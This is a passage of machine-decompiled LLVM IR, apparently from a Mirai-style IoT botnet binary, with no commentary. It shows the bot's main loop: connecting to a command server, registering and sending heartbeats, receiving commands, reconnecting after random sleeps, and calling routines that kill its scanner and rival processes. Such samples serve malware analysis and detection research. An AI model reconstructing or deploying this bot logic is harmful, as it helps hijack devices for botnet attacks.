  store i32 %v0_804e6ce, i32* %v3_804e6d3, align 4
  %v0_804e6d4 = call i32 @__libc_recv()
  store i32 %v0_804e6d4, i32* %eax.global-to-local, align 4
  %v0_804e6d9 = load i32, i32* @esp, align 4
  %v1_804e6d9 = add i32 %v0_804e6d9, 16
  %v10_804e6dc = icmp eq i32 %v0_804e6d4, -1
  br i1 %v10_804e6dc, label %dec_label_pc_804e928, label %dec_label_pc_804e6e5

dec_label_pc_804e6e5:                             ; preds = %dec_label_pc_804e6a8
  %v1_804e6e5 = icmp eq i32 %v0_804e6d4, 0
  br i1 %v1_804e6e5, label %dec_label_pc_804e93c, label %dec_label_pc_804e6ed

dec_label_pc_804e6ed:                             ; preds = %dec_label_pc_804e6e5
  %v1_804e6ed = add i32 %v0_804e6d9, 1430
  %v2_804e6ed = inttoptr i32 %v1_804e6ed to i16*
  %v3_804e6ed = load i16, i16* %v2_804e6ed, align 2
  %v4_804e6ed = zext i16 %v3_804e6ed to i32
  %v6_804e6ed = and i32 %v0_804e6d4, -65536
  %v7_804e6ed = or i32 %v4_804e6ed, %v6_804e6ed
  store i32 %v7_804e6ed, i32* %eax.global-to-local, align 4
  %v4_804e6f5 = icmp eq i16 %v3_804e6ed, 0
  %v1_804e6f8 = icmp eq i1 %v4_804e6f5, false
  br i1 %v1_804e6f8, label %dec_label_pc_804e96d, label %dec_label_pc_804e6fe

dec_label_pc_804e6fe:                             ; preds = %dec_label_pc_804e6ed
  %v1_804e6fe = add i32 %v0_804e6d9, 12
  %v2_804e6fe = inttoptr i32 %v1_804e6fe to i32*
  store i32 16384, i32* %v2_804e6fe, align 4
  %v1_804e703 = add i32 %v0_804e6d9, 8
  %v2_804e703 = inttoptr i32 %v1_804e703 to i32*
  store i32 2, i32* %v2_804e703, align 4
  store i32 %v1_804e6ed, i32* %ecx.global-to-local, align 4
  %v2_804e70c = add i32 %v0_804e6d9, 4
  %v3_804e70c = inttoptr i32 %v2_804e70c to i32*
  store i32 %v1_804e6ed, i32* %v3_804e70c, align 4
  %v0_804e70d = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e70d, i32* %eax.global-to-local, align 4
  %v3_804e712 = inttoptr i32 %v0_804e6d9 to i32*
  store i32 %v0_804e70d, i32* %v3_804e712, align 4
  %v0_804e713 = call i32 @__libc_recv()
  store i32 %v0_804e713, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e510.backedge

dec_label_pc_804e720:                             ; preds = %dec_label_pc_804e540
  %v2_804e720 = add i32 %v1_804e720, -4
  %v3_804e720 = inttoptr i32 %v2_804e720 to i32*
  store i32 %v6_804e523, i32* %v3_804e720, align 4
  %v1_804e721 = add i32 %v1_804e720, -8
  %v2_804e721 = inttoptr i32 %v1_804e721 to i32*
  store i32 0, i32* %v2_804e721, align 4
  %v1_804e723 = add i32 %v1_804e720, -12
  %v2_804e723 = inttoptr i32 %v1_804e723 to i32*
  store i32 1, i32* %v2_804e723, align 4
  %v1_804e725 = add i32 %v1_804e720, -16
  %v2_804e725 = inttoptr i32 %v1_804e725 to i32*
  store i32 2, i32* %v2_804e725, align 4
  %v0_804e727 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e727 = load i32, i32* %stack_var_-1452, align 4
  %v2_804e727 = load i32, i32* %stack_var_-1448, align 4
  %v3_804e727 = call i32 @socket(i32 %v0_804e727, i32 %v1_804e727, i32 %v2_804e727)
  store i32 %v3_804e727, i32* %eax.global-to-local, align 4
  %v0_804e72c = load i32, i32* @esp, align 4
  %v1_804e72c = add i32 %v0_804e72c, 16
  store i32 %v3_804e727, i32* @global_var_8057b98.39, align 8
  %v10_804e734 = icmp eq i32 %v3_804e727, -1
  br i1 %v10_804e734, label %dec_label_pc_804e54d, label %dec_label_pc_804e73d

dec_label_pc_804e73d:                             ; preds = %dec_label_pc_804e720
  %v0_804e73d = load i32, i32* @edx, align 4
  %v2_804e73d = add i32 %v0_804e72c, 12
  %v3_804e73d = inttoptr i32 %v2_804e73d to i32*
  store i32 %v0_804e73d, i32* %v3_804e73d, align 4
  %v1_804e73e = add i32 %v0_804e72c, 8
  %v2_804e73e = inttoptr i32 %v1_804e73e to i32*
  store i32 0, i32* %v2_804e73e, align 4
  %v1_804e740 = add i32 %v0_804e72c, 4
  %v2_804e740 = inttoptr i32 %v1_804e740 to i32*
  store i32 3, i32* %v2_804e740, align 4
  %v3_804e742 = inttoptr i32 %v0_804e72c to i32*
  store i32 %v3_804e727, i32* %v3_804e742, align 4
  %v0_804e743 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e743 = load i32, i32* %stack_var_-1452, align 4
  %v2_804e743 = load i32, i32* %stack_var_-1448, align 4
  %v3_804e743 = call i32 @__libc_fcntl(i32 %v0_804e743, i32 %v1_804e743, i32 %v2_804e743)
  %v0_804e748 = load i32, i32* @esp, align 4
  %v12_804e74b = or i32 %v3_804e743, 2048
  %v2_804e74e = add i32 %v0_804e748, 8
  %v3_804e74e = inttoptr i32 %v2_804e74e to i32*
  store i32 %v12_804e74b, i32* %v3_804e74e, align 4
  %v1_804e74f = add i32 %v0_804e748, 4
  %v2_804e74f = inttoptr i32 %v1_804e74f to i32*
  store i32 4, i32* %v2_804e74f, align 4
  %v0_804e751 = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e751, i32* %eax.global-to-local, align 4
  %v3_804e756 = inttoptr i32 %v0_804e748 to i32*
  store i32 %v0_804e751, i32* %v3_804e756, align 4
  %v0_804e757 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e757 = load i32, i32* %stack_var_-1452, align 4
  %v2_804e757 = load i32, i32* %stack_var_-1448, align 4
  %v3_804e757 = call i32 @__libc_fcntl(i32 %v0_804e757, i32 %v1_804e757, i32 %v2_804e757)
  %v0_804e75c = load i32, i32* @global_var_8057b9c.31, align 4
  store i32 %v0_804e75c, i32* %eax.global-to-local, align 4
  %v0_804e761 = load i32, i32* @esp, align 4
  %v1_804e761 = add i32 %v0_804e761, 16
  %v1_804e764 = icmp eq i32 %v0_804e75c, 0
  br i1 %v1_804e764, label %dec_label_pc_804e76a, label %dec_label_pc_804e768

dec_label_pc_804e768:                             ; preds = %dec_label_pc_804e73d
  %v0_804e768 = call i32 @util_local_addr()
  store i32 %v0_804e768, i32* %eax.global-to-local, align 4
  %v1_804e771.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e76a

dec_label_pc_804e76a:                             ; preds = %dec_label_pc_804e768, %dec_label_pc_804e73d
  %v1_804e771 = phi i32 [ %v1_804e771.pre, %dec_label_pc_804e768 ], [ %v1_804e761, %dec_label_pc_804e73d ]
  %v0_804e771 = phi i32 [ %v0_804e768, %dec_label_pc_804e768 ], [ 0, %dec_label_pc_804e73d ]
  store i8 1, i8* @global_var_8057d30.40, align 16
  %v2_804e771 = add i32 %v1_804e771, -4
  %v3_804e771 = inttoptr i32 %v2_804e771 to i32*
  store i32 %v0_804e771, i32* %v3_804e771, align 4
  %v1_804e772 = add i32 %v1_804e771, -8
  %v2_804e772 = inttoptr i32 %v1_804e772 to i32*
  store i32 16, i32* %v2_804e772, align 4
  %v1_804e774 = add i32 %v1_804e771, -12
  %v2_804e774 = inttoptr i32 %v1_804e774 to i32*
  store i32 ptrtoint (i32* @global_var_805a860.37 to i32), i32* %v2_804e774, align 4
  %v0_804e779 = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e779, i32* %eax.global-to-local, align 4
  %v2_804e77e = add i32 %v1_804e771, -16
  %v3_804e77e = inttoptr i32 %v2_804e77e to i32*
  store i32 %v0_804e779, i32* %v3_804e77e, align 4
  %v0_804e77f = load i32, i32* %stack_var_-1456, align 4
  %v1_804e77f = load i32, i32* %stack_var_-1452, align 4
  %v2_804e77f = load i32, i32* %stack_var_-1448, align 4
  %v3_804e77f = call i32 @__libc_connect(i32 %v0_804e77f, i32 %v1_804e77f, i32 %v2_804e77f)
  store i32 %v3_804e77f, i32* %eax.global-to-local, align 4
  %v0_804e784 = load i32, i32* @esp, align 4
  %v1_804e784 = add i32 %v0_804e784, 16
  %v0_804e664.pre = load i32, i32* @global_var_8057b98.39, align 8
  br label %dec_label_pc_804e54d

dec_label_pc_804e78c:                             ; preds = %dec_label_pc_804e5bc
  %v0_804e78c = load i32, i32* @esp, align 4
  %v1_804e78c = add i32 %v0_804e78c, -4
  %v2_804e78c = inttoptr i32 %v1_804e78c to i32*
  store i32 16384, i32* %v2_804e78c, align 4
  %v1_804e791 = add i32 %v0_804e78c, -8
  %v2_804e791 = inttoptr i32 %v1_804e791 to i32*
  store i32 2, i32* %v2_804e791, align 4
  %v1_804e793 = add i32 %v0_804e78c, 1414
  %v2_804e79a = add i32 %v0_804e78c, -12
  %v3_804e79a = inttoptr i32 %v2_804e79a to i32*
  store i32 %v1_804e793, i32* %v3_804e79a, align 4
  %v0_804e79b = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e79b, i32* %eax.global-to-local, align 4
  %v2_804e7a0 = add i32 %v0_804e78c, -16
  %v3_804e7a0 = inttoptr i32 %v2_804e7a0 to i32*
  store i32 %v0_804e79b, i32* %v3_804e7a0, align 4
  %v0_804e7a1 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e7a1 = load i32, i32* %stack_var_-1452, align 4
  %v2_804e7a1 = load i32, i32* %stack_var_-1448, align 4
  %v4_804e7a1 = call i32 @__libc_send(i32 %v0_804e7a1, i32 %v1_804e7a1, i32 %v2_804e7a1, i32 %stack_var_-1444.0)
  store i32 %v4_804e7a1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e5dc

dec_label_pc_804e7ae:                             ; preds = %dec_label_pc_804e60d
  %v1_804e7ae = add i32 %v0_804e624, 1404
  %v2_804e7ae = inttoptr i32 %v1_804e7ae to i32*
  store i32 0, i32* %v2_804e7ae, align 4
  %v0_804e7b9 = load i32, i32* @esp, align 4
  %v1_804e7b9 = add i32 %v0_804e7b9, 1400
  %v2_804e7b9 = inttoptr i32 %v1_804e7b9 to i32*
  store i32 4, i32* %v2_804e7b9, align 4
  %v0_804e7c4 = load i32, i32* @esp, align 4
  %v1_804e7c7 = add i32 %v0_804e7c4, 1400
  %v2_804e7ce = add i32 %v0_804e7c4, -16
  %v3_804e7ce = inttoptr i32 %v2_804e7ce to i32*
  store i32 %v1_804e7c7, i32* %v3_804e7ce, align 4
  %v1_804e7cf = add i32 %v0_804e7c4, 1404
  store i32 %v1_804e7cf, i32* %eax.global-to-local, align 4
  %v2_804e7d6 = add i32 %v0_804e7c4, -20
  %v3_804e7d6 = inttoptr i32 %v2_804e7d6 to i32*
  store i32 %v1_804e7cf, i32* %v3_804e7d6, align 4
  %v1_804e7d7 = add i32 %v0_804e7c4, -24
  %v2_804e7d7 = inttoptr i32 %v1_804e7d7 to i32*
  store i32 4, i32* %v2_804e7d7, align 4
  %v1_804e7d9 = add i32 %v0_804e7c4, -28
  %v2_804e7d9 = inttoptr i32 %v1_804e7d9 to i32*
  store i32 1, i32* %v2_804e7d9, align 4
  %v0_804e7db = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e7db = add i32 %v0_804e7c4, -32
  %v3_804e7db = inttoptr i32 %v2_804e7db to i32*
  store i32 %v0_804e7db, i32* %v3_804e7db, align 4
  %v0_804e7dc = call i32 @getsockopt()
  store i32 %v0_804e7dc, i32* %eax.global-to-local, align 4
  %v0_804e7e1 = load i32, i32* @esp, align 4
  %v1_804e7e1 = add i32 %v0_804e7e1, 32
  %v1_804e7e4 = add i32 %v0_804e7e1, 1436
  %v2_804e7e4 = inttoptr i32 %v1_804e7e4 to i32*
  %v3_804e7e4 = load i32, i32* %v2_804e7e4, align 4
  store i32 %v3_804e7e4, i32* @eax, align 4
  %v1_804e7eb = icmp eq i32 %v3_804e7e4, 0
  br i1 %v1_804e7eb, label %dec_label_pc_804e89a, label %dec_label_pc_804e7f3

dec_label_pc_804e7f3:                             ; preds = %dec_label_pc_804e7ae
  %v0_804e7f6 = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e7f6, i32* %edi.global-to-local, align 4
  %v2_804e7fc = add i32 %v0_804e7e1, 16
  %v3_804e7fc = inttoptr i32 %v2_804e7fc to i32*
  store i32 %v0_804e7f6, i32* %v3_804e7fc, align 4
  %v0_804e7fd = load i32, i32* %stack_var_-1456, align 4
  %v1_804e7fd = call i32 @__GI___libc_close(i32 %v0_804e7fd)
  store i32 %v1_804e7fd, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @global_var_8057b98.39, align 8
  %v0_804e80c = load i32, i32* %stack_var_-1456, align 4
  %v1_804e80c = call i32 @rand_next(i32 %v0_804e80c)
  %v2_804e80c = sext i32 %v1_804e80c to i64
  %v0_804e811 = load i32, i32* @esp, align 4
  store i32 -858993459, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e80c, i32* %edi.global-to-local, align 4
  %v5_804e819 = mul nuw nsw i64 %v2_804e80c, 3435973837
  %v6_804e819 = trunc i64 %v5_804e819 to i32
  %v7_804e819 = udiv i64 %v5_804e819, 4294967296
  %v8_804e819 = trunc i64 %v7_804e819 to i32
  store i32 %v6_804e819, i32* %eax.global-to-local, align 4
  store i32 %v8_804e819, i32* %edx.global-to-local, align 4
  %v2_804e81b = add i32 %v0_804e811, 20
  %v3_804e81b = inttoptr i32 %v2_804e81b to i32*
  store i32 %v8_804e819, i32* %v3_804e81b, align 4
  %v0_804e81f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e81f = load i32, i32* @esp, align 4
  %v2_804e81f = add i32 %v1_804e81f, 12
  %v3_804e81f = inttoptr i32 %v2_804e81f to i32*
  store i32 %v0_804e81f, i32* %v3_804e81f, align 4
  %v0_804e823 = load i32, i32* @esp, align 4
  %v1_804e823 = add i32 %v0_804e823, 16
  %v2_804e823 = inttoptr i32 %v1_804e823 to i32*
  %v3_804e823 = load i32, i32* %v2_804e823, align 4
  %v2_804e827 = udiv i32 %v3_804e823, 8
  %v2_804e82d = mul i32 %v2_804e827, 10
  store i32 %v2_804e82d, i32* %edx.global-to-local, align 4
  %v0_804e82f = load i32, i32* %edi.global-to-local, align 4
  %v2_804e82f = sub i32 %v0_804e82f, %v2_804e82d
  store i32 %v2_804e82f, i32* @edi, align 4
  %v1_804e831 = add i32 %v2_804e82f, 1
  store i32 %v1_804e831, i32* %eax.global-to-local, align 4
  %v2_804e834 = add i32 %v0_804e823, -4
  %v3_804e834 = inttoptr i32 %v2_804e834 to i32*
  store i32 %v1_804e831, i32* %v3_804e834, align 4
  %v0_804e835 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e835 = call i32 @sleep(i32 %v0_804e835)
  store i32 %v1_804e835, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e510.backedge

dec_label_pc_804e842:                             ; preds = %dec_label_pc_804e5e7
  %v1_804e842 = add i32 %v0_804e5f1, 1404
  %v2_804e842 = inttoptr i32 %v1_804e842 to i32*
  store i32 16, i32* %v2_804e842, align 4
  %v0_804e84d = load i32, i32* @esp, align 4
  %v1_804e84d = add i32 %v0_804e84d, 1368
  store i32 %v1_804e84d, i32* %eax.global-to-local, align 4
  %v3_804e854 = add i32 %v0_804e84d, -4
  %v4_804e854 = inttoptr i32 %v3_804e854 to i32*
  store i32 %v0_804e520, i32* %v4_804e854, align 4
  %v1_804e855 = add i32 %v0_804e84d, 1404
  store i32 %v1_804e855, i32* %edx.global-to-local, align 4
  %v2_804e85c = add i32 %v0_804e84d, -8
  %v3_804e85c = inttoptr i32 %v2_804e85c to i32*
  store i32 %v1_804e855, i32* %v3_804e85c, align 4
  %v0_804e85d = load i32, i32* %eax.global-to-local, align 4
  %v2_804e85d = add i32 %v0_804e84d, -12
  %v3_804e85d = inttoptr i32 %v2_804e85d to i32*
  store i32 %v0_804e85d, i32* %v3_804e85d, align 4
  %v0_804e85e = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e85e = add i32 %v0_804e84d, -16
  %v3_804e85e = inttoptr i32 %v2_804e85e to i32*
  store i32 %v0_804e85e, i32* %v3_804e85e, align 4
  %v0_804e85f = call i32 @__libc_accept()
  store i32 %v0_804e85f, i32* %eax.global-to-local, align 4
  %v0_804e864 = call i32 @scanner_kill()
  store i32 %v0_804e864, i32* %eax.global-to-local, align 4
  %v0_804e869 = call i32 @killer_kill()
  store i32 %v0_804e869, i32* %eax.global-to-local, align 4
  %v0_804e86e = load i32, i32* @esp, align 4
  %v1_804e86e = inttoptr i32 %v0_804e86e to i32*
  %v2_804e86e = load i32, i32* %v1_804e86e, align 4
  store i32 %v2_804e86e, i32* @ebx, align 4
  %v3_804e86e = add i32 %v0_804e86e, 4
  %v1_804e86f = inttoptr i32 %v3_804e86e to i32*
  store i32 9, i32* %v1_804e86f, align 4
  %v1_804e872 = add i32 %v0_804e86e, 32
  %v2_804e872 = inttoptr i32 %v1_804e872 to i32*
  %v3_804e872 = load i32, i32* %v2_804e872, align 4
  %v4_804e872 = sub i32 0, %v3_804e872
  store i32 %v4_804e872, i32* %v2_804e872, align 4
  %v0_804e876 = load i32, i32* @esp, align 4
  %v1_804e876 = add i32 %v0_804e876, 28
  %v2_804e876 = inttoptr i32 %v1_804e876 to i32*
  %v3_804e876 = load i32, i32* %v2_804e876, align 4
  store i32 %v3_804e876, i32* %ecx.global-to-local, align 4
  %v2_804e87a = add i32 %v0_804e876, -4
  %v3_804e87a = inttoptr i32 %v2_804e87a to i32*
  store i32 %v3_804e876, i32* %v3_804e87a, align 4
  %v0_804e87b = load i32, i32* %stack_var_-1456, align 4
  %v1_804e87b = load i32, i32* %stack_var_-1452, align 4
  %v2_804e87b = call i32 @kill(i32 %v0_804e87b, i32 %v1_804e87b)
  %v0_804e880 = load i32, i32* @global_var_8057d2c.36, align 4
  store i32 %v0_804e880, i32* %eax.global-to-local, align 4
  %v0_804e885 = load i32, i32* @esp, align 4
  %v1_804e888 = icmp eq i32 %v0_804e880, 0
  %v1_804e88a = icmp eq i1 %v1_804e888, false
  br i1 %v1_804e88a, label %dec_label_pc_804e95b, label %dec_label_pc_804e890

dec_label_pc_804e890:                             ; preds = %dec_label_pc_804e842, %dec_label_pc_804e95b
  %v0_804e890.in = phi i32 [ %v0_804e885, %dec_label_pc_804e842 ], [ %v0_804e965, %dec_label_pc_804e95b ]
  %v2_804e893 = inttoptr i32 %v0_804e890.in to i32*
  store i32 0, i32* %v2_804e893, align 4
  %v0_804e895 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e895 = call i32 @__GI_exit(i32 %v0_804e895)
  store i32 %v1_804e895, i32* %eax.global-to-local, align 4
  %v0_804e89a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e89a

dec_label_pc_804e89a:                             ; preds = %dec_label_pc_804e7ae, %dec_label_pc_804e890
  %v0_804e89a = phi i32 [ %v1_804e7e1, %dec_label_pc_804e7ae ], [ %v0_804e89a.pre, %dec_label_pc_804e890 ]
  %v1_804e89d = add i32 %v0_804e89a, 1304
  store i32 %v1_804e89d, i32* %edx.global-to-local, align 4
  %v2_804e8a4 = add i32 %v0_804e89a, -16
  %v3_804e8a4 = inttoptr i32 %v2_804e8a4 to i32*
  store i32 %v1_804e89d, i32* %v3_804e8a4, align 4
  %v0_804e8a5 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e8a5 = inttoptr i32 %v0_804e8a5 to i8*
  %v2_804e8a5 = call i32 @util_strlen(i8* %v1_804e8a5)
  %v3_804e8a5 = trunc i32 %v2_804e8a5 to i8
  store i32 %v2_804e8a5, i32* %eax.global-to-local, align 4
  %v3_804e8aa = load i32, i32* @esp, align 4
  %v4_804e8aa = add i32 %v3_804e8aa, 1430
  %v5_804e8aa = inttoptr i32 %v4_804e8aa to i8*
  store i8 %v3_804e8a5, i8* %v5_804e8aa, align 1
  %v0_804e8b1 = call i32 @util_local_addr()
  store i32 %v0_804e8b1, i32* %eax.global-to-local, align 4
  store i32 %v0_804e8b1, i32* @global_var_805a858.27, align 8
  %v0_804e8bb = load i32, i32* @esp, align 4
  %v1_804e8bb = add i32 %v0_804e8bb, -4
  %v2_804e8bb = inttoptr i32 %v1_804e8bb to i32*
  store i32 16384, i32* %v2_804e8bb, align 4
  %v1_804e8c0 = add i32 %v0_804e8bb, -8
  %v2_804e8c0 = inttoptr i32 %v1_804e8c0 to i32*
  store i32 4, i32* %v2_804e8c0, align 4
  %v1_804e8c2 = add i32 %v0_804e8bb, -12
  %v2_804e8c2 = inttoptr i32 %v1_804e8c2 to i32*
  store i32 ptrtoint (i32* @global_var_8055890.41 to i32), i32* %v2_804e8c2, align 4
  %v0_804e8c7 = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e8c7, i32* %edx.global-to-local, align 4
  %v2_804e8cd = add i32 %v0_804e8bb, -16
  %v3_804e8cd = inttoptr i32 %v2_804e8cd to i32*
  store i32 %v0_804e8c7, i32* %v3_804e8cd, align 4
  %v0_804e8ce = load i32, i32* %stack_var_-1456, align 4
  %v1_804e8ce = load i32, i32* %stack_var_-1452, align 4
  %v2_804e8ce = load i32, i32* %stack_var_-1448, align 4
  %v4_804e8ce = call i32 @__libc_send(i32 %v0_804e8ce, i32 %v1_804e8ce, i32 %v2_804e8ce, i32 %stack_var_-1444.0)
  %v0_804e8d3 = load i32, i32* @esp, align 4
  %v1_804e8d6 = add i32 %v0_804e8d3, 28
  %v2_804e8d6 = inttoptr i32 %v1_804e8d6 to i32*
  store i32 16384, i32* %v2_804e8d6, align 4
  %v1_804e8db = add i32 %v0_804e8d3, 24
  %v2_804e8db = inttoptr i32 %v1_804e8db to i32*
  store i32 1, i32* %v2_804e8db, align 4
  %v1_804e8dd = add i32 %v0_804e8d3, 1446
  store i32 %v1_804e8dd, i32* %ecx.global-to-local, align 4
  %v2_804e8e4 = add i32 %v0_804e8d3, 20
  %v3_804e8e4 = inttoptr i32 %v2_804e8e4 to i32*
  store i32 %v1_804e8dd, i32* %v3_804e8e4, align 4
  %v0_804e8e5 = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e8e5, i32* %eax.global-to-local, align 4
  %v2_804e8ea = add i32 %v0_804e8d3, 16
  %v3_804e8ea = inttoptr i32 %v2_804e8ea to i32*
  store i32 %v0_804e8e5, i32* %v3_804e8ea, align 4
  %v0_804e8eb = load i32, i32* %stack_var_-1456, align 4
  %v1_804e8eb = load i32, i32* %stack_var_-1452, align 4
  %v2_804e8eb = load i32, i32* %stack_var_-1448, align 4
  %v4_804e8eb = call i32 @__libc_send(i32 %v0_804e8eb, i32 %v1_804e8eb, i32 %v2_804e8eb, i32 %stack_var_-1444.0)
  store i32 %v4_804e8eb, i32* %eax.global-to-local, align 4
  %v0_804e8f0 = load i32, i32* @esp, align 4
  %v1_804e8f0 = add i32 %v0_804e8f0, 1430
  %v2_804e8f0 = inttoptr i32 %v1_804e8f0 to i8*
  %v3_804e8f0 = load i8, i8* %v2_804e8f0, align 1
  %v4_804e8f0 = zext i8 %v3_804e8f0 to i32
  %v6_804e8f0 = and i32 %v4_804e8eb, -256
  %v7_804e8f0 = or i32 %v4_804e8f0, %v6_804e8f0
  store i32 %v7_804e8f0, i32* %eax.global-to-local, align 4
  %v4_804e8fa = icmp eq i8 %v3_804e8f0, 0
  br i1 %v4_804e8fa, label %dec_label_pc_804e510.backedge, label %dec_label_pc_804e902

dec_label_pc_804e902:                             ; preds = %dec_label_pc_804e89a
  store i32 %v4_804e8f0, i32* %eax.global-to-local, align 4
  %v1_804e907 = add i32 %v0_804e8f0, 12
  %v2_804e907 = inttoptr i32 %v1_804e907 to i32*
  store i32 16384, i32* %v2_804e907, align 4
  %v0_804e90c = load i32, i32* %eax.global-to-local, align 4
  %v2_804e90c = add i32 %v0_804e8f0, 8
  %v3_804e90c = inttoptr i32 %v2_804e90c to i32*
  store i32 %v0_804e90c, i32* %v3_804e90c, align 4
  %v1_804e90d = add i32 %v0_804e8f0, 1320
  %v2_804e914 = add i32 %v0_804e8f0, 4
  %v3_804e914 = inttoptr i32 %v2_804e914 to i32*
  store i32 %v1_804e90d, i32* %v3_804e914, align 4
  %v0_804e915 = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e915, i32* %eax.global-to-local, align 4
  %v3_804e91a = inttoptr i32 %v0_804e8f0 to i32*
  store i32 %v0_804e915, i32* %v3_804e91a, align 4
  %v0_804e91b = load i32, i32* %stack_var_-1456, align 4
  %v1_804e91b = load i32, i32* %stack_var_-1452, align 4
  %v2_804e91b = load i32, i32* %stack_var_-1448, align 4
  %v4_804e91b = call i32 @__libc_send(i32 %v0_804e91b, i32 %v1_804e91b, i32 %v2_804e91b, i32 %stack_var_-1444.0)
  store i32 %v4_804e91b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e510.backedge

dec_label_pc_804e928:                             ; preds = %dec_label_pc_804e99f, %dec_label_pc_804e6a8
  %v0_804e94a13 = phi i32 [ %v1_804e9c0, %dec_label_pc_804e99f ], [ %v1_804e6d9, %dec_label_pc_804e6a8 ]
  %v0_804e928 = load i32, i32* @edi, align 4
  %v1_804e928 = inttoptr i32 %v0_804e928 to i32*
  %v2_804e928 = load i32, i32* %v1_804e928, align 4
  store i32 %v2_804e928, i32* %eax.global-to-local, align 4
  %v9_804e92a = icmp eq i32 %v2_804e928, 11
  br i1 %v9_804e92a, label %dec_label_pc_804e510.backedge, label %dec_label_pc_804e933

dec_label_pc_804e933:                             ; preds = %dec_label_pc_804e928
  %v9_804e933 = icmp eq i32 %v2_804e928, 4
  br i1 %v9_804e933, label %dec_label_pc_804e510.backedge, label %dec_label_pc_804e93c

dec_label_pc_804e93c:                             ; preds = %dec_label_pc_804e9cc, %dec_label_pc_804e933, %dec_label_pc_804e6e5
  %v0_804e94a = phi i32 [ %v1_804e9c0, %dec_label_pc_804e9cc ], [ %v0_804e94a13, %dec_label_pc_804e933 ], [ %v1_804e6d9, %dec_label_pc_804e6e5 ]
  %v0_804e93c = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e93c, i32* @eax, align 4
  %v10_804e941 = icmp eq i32 %v0_804e93c, -1
  br i1 %v10_804e941, label %dec_label_pc_804e648, label %dec_label_pc_804e94a

dec_label_pc_804e94a:                             ; preds = %dec_label_pc_804e93c
  %v2_804e94d = add i32 %v0_804e94a, -16
  %v3_804e94d = inttoptr i32 %v2_804e94d to i32*
  store i32 %v0_804e93c, i32* %v3_804e94d, align 4
  %v0_804e94e = load i32, i32* %stack_var_-1456, align 4
  %v1_804e94e = call i32 @__GI___libc_close(i32 %v0_804e94e)
  store i32 %v1_804e94e, i32* %eax.global-to-local, align 4
  %v0_804e953 = load i32, i32* @esp, align 4
  %v1_804e953 = add i32 %v0_804e953, 16
  br label %dec_label_pc_804e648

dec_label_pc_804e95b:                             ; preds = %dec_label_pc_804e842
  %v0_804e95b = load i32, i32* @edx, align 4
  %v2_804e95b = add i32 %v0_804e885, 12
  %v3_804e95b = inttoptr i32 %v2_804e95b to i32*
  store i32 %v0_804e95b, i32* %v3_804e95b, align 4
  %v0_804e95c = load i32, i32* @edx, align 4
  %v2_804e95c = add i32 %v0_804e885, 8
  %v3_804e95c = inttoptr i32 %v2_804e95c to i32*
  store i32 %v0_804e95c, i32* %v3_804e95c, align 4
  %v1_804e95d = add i32 %v0_804e885, 4
  %v2_804e95d = inttoptr i32 %v1_804e95d to i32*
  store i32 9, i32* %v2_804e95d, align 4
  %v3_804e95f = inttoptr i32 %v0_804e885 to i32*
  store i32 %v0_804e880, i32* %v3_804e95f, align 4
  %v0_804e960 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e960 = load i32, i32* %stack_var_-1452, align 4
  %v2_804e960 = call i32 @kill(i32 %v0_804e960, i32 %v1_804e960)
  store i32 %v2_804e960, i32* %eax.global-to-local, align 4
  %v0_804e965 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e890

dec_label_pc_804e96d:                             ; preds = %dec_label_pc_804e6ed
  %v2_804e96d = call i16 @llvm.bswap.i16(i16 %v3_804e6ed)
  %v3_804e96d = zext i16 %v2_804e96d to i32
  %v6_804e96d = or i32 %v3_804e96d, %v6_804e6ed
  store i32 %v6_804e96d, i32* %eax.global-to-local, align 4
  %v4_804e971 = icmp ult i16 %v2_804e96d, 1024
  %v8_804e971 = icmp eq i16 %v3_804e6ed, 4
  store i16 %v2_804e96d, i16* %v2_804e6ed, align 2
  %v2_804e97d = or i1 %v8_804e971, %v4_804e971
  br i1 %v2_804e97d, label %dec_label_pc_804e99f, label %dec_label_pc_804e97f

dec_label_pc_804e97f:                             ; preds = %dec_label_pc_804e96d
  %v0_804e97f = load i32, i32* @esp, align 4
  %v0_804e982 = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e982, i32* @eax, align 4
  %v2_804e987 = add i32 %v0_804e97f, -16
  %v3_804e987 = inttoptr i32 %v2_804e987 to i32*
  store i32 %v0_804e982, i32* %v3_804e987, align 4
  %v0_804e988 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e988 = call i32 @__GI___libc_close(i32 %v0_804e988)
  store i32 %v1_804e988, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @global_var_8057b98.39, align 8
  br label %dec_label_pc_804e510.backedge

dec_label_pc_804e99f:                             ; preds = %dec_label_pc_804e96d
  store i32 %v3_804e96d, i32* %eax.global-to-local, align 4
  %v0_804e9a4 = load i32, i32* @edi, align 4
  %v1_804e9a4 = inttoptr i32 %v0_804e9a4 to i32*
  store i32 0, i32* %v1_804e9a4, align 4
  %v0_804e9aa = load i32, i32* @esp, align 4
  %v1_804e9aa = add i32 %v0_804e9aa, -4
  %v2_804e9aa = inttoptr i32 %v1_804e9aa to i32*
  store i32 16386, i32* %v2_804e9aa, align 4
